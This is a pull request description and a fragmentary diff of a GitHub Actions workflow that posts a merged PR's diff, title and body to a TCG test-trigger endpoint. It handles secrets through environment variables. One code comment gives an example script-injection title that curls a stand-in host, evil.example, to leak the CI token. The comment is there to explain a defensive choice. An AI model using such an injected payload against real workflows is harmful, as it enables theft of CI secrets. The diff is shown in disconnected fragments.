## Description

On a merged pull request (or by hand from the Actions tab), sends the diff, PR title/description and commit info to TCG's trigger endpoint, which picks the relevant subset of this project's existing automation suite and re-runs it. File is the one TCG generates from the project's CI/CD settings, added as-is.

Needs two repository secrets before it can run: TCG_CICD_TOKEN and TCG_CICD_ENDPOINT_URL (both shown on the project's CI/CD settings screen in TCG). Without them the run fails with a clear error and sends nothing.

+#                    settings — kept as a secret, not a literal in this file,
+#                    so a fork/PR diff of this workflow never has to show it
+#
+# Which of the triggers below are present is controlled by this project's
+# own CI/CD settings (the "Trigger types" section) — re-download this file
+# after changing that picker to pick up the change.
+name: TCG CI/CD Automation Testing
+
+on:

+  pull_request:
+    types: [closed]
+  # Lets you fire it by hand from the Actions tab.
+  workflow_dispatch:
+

+    # closed-without-merge PR (or a workflow_dispatch, which has no
+    # pull_request context at all) must not.

+          fetch-depth: 0

+        id: diff

+            git diff "${{ github.event.pull_request.base.sha }}" "${{ github.event.pull_request.head.sha }}" > diff.txt
+          else
+            # Push-based / manual-dispatch fallback: diff against the previous commit.
+            git diff HEAD~1 HEAD > diff.txt || touch diff.txt
+          fi
+          {
+            echo "commit_sha=${GITHUB_SHA}"
+            echo "branch=${GITHUB_REF_NAME}"
+          } >> "$GITHUB_OUTPUT"
+

+        env:

+          TCG_CICD_ENDPOINT_URL: ${{ secrets.TCG_CICD_ENDPOINT_URL }}

+          # a PR's title/description are attacker-controlled on any repo
+          # taking outside contributions, and inlining
+          # ${{ github.event.pull_request.title }} straight into a run: block
+          # is the textbook GitHub Actions script-injection hole: a title
+          # like "; curl evil.example/$TCG_CICD_TOKEN #" would execute as
+          # shell code the instant this step runs, before jq ever sees it.
+          # Landing in an env var instead means bash hands it to jq as inert
+          # data, exactly like TCG_CICD_TOKEN above already has to.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}

+          # newlines, quotes and backslashes included — without ever putting the
+          # diff on jq's command line. Building this with plain string
+          # concatenation is exactly how a stray quote or backtick in a diff line
+          # turns into a shell-injection or malformed-JSON bug; passing it via
+          # --arg diff "$(cat diff.txt)" instead fails on any real-sized PR with

+          # runner's ARG_MAX — --rawfile has no such limit since jq reads the
